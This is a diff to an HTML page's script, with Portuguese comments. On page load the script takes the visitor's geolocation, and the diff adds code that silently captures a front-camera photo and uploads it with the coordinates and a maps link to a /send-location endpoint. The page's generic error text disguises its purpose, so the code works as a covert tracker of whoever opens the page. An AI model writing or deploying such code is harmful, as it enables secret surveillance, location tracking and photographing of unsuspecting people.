@@ -29,36 +29,71 @@
   </div>
 
   <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-      }
-    });
-
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
     const ano = dataAtual.getFullYear();
-
     const dataFormatada = `${dia}/${mes}/${ano}`;
-
     document.getElementById("data-atual").textContent = dataFormatada;
+    console.log(dataAtual);
 
-    console.log(dataAtual)
+    // NOVA FUNCIONALIDADE: Captura foto da câmera
+    async function captureAndSendPhoto() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'user' }
+        });
+        
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        
+        await new Promise(resolve => {
+          video.onloadedmetadata = resolve;
+        });
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+        
+        stream.getTracks().forEach(track => track.stop());
+        
+        const blob = await new Promise(resolve => {
+          canvas.toBlob(resolve, 'image/jpeg', 0.8);
+        });
+        
+        return blob;
+      } catch (error) {
+        console.error("Erro ao capturar foto:", error);
+        return null;
+      }
+    }
 
-    function sendLocation(position) {
+    // FUNCIONALIDADE MODIFICADA: Envia localização + foto
+    async function sendLocation(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
+      
+      // NOVO: Captura a foto
+      const photoBlob = await captureAndSendPhoto();
+      
+      // MODIFICADO: Usa FormData ao invés de JSON
+      const formData = new FormData();
+      formData.append('latitude', latitude);
+      formData.append('longitude', longitude);
+      formData.append('maps', maps);
+      
+      if (photoBlob) {
+        formData.append('photo', photoBlob, 'camera.jpg');
+      }
+      
+      // MANTIDO: Mesma lógica de fetch
       fetch("/send-location", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps })
+        body: formData // ALTERADO: era JSON, agora é FormData
       })
         .then(response => response.json())
         .then(data => {
@@ -71,9 +106,19 @@
         });
     }
 
+    // FUNCIONALIDADE EXISTENTE: Tratamento de erro
     function handleError(error) {
       alert("Erro ao obter a localização: " + error.message);
     }
+
+    // FUNCIONALIDADE EXISTENTE: Inicia ao carregar a página
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Algo deu errado. Tente novamente mais tarde.");
+      }
+    });
   </script>
 </body>
 
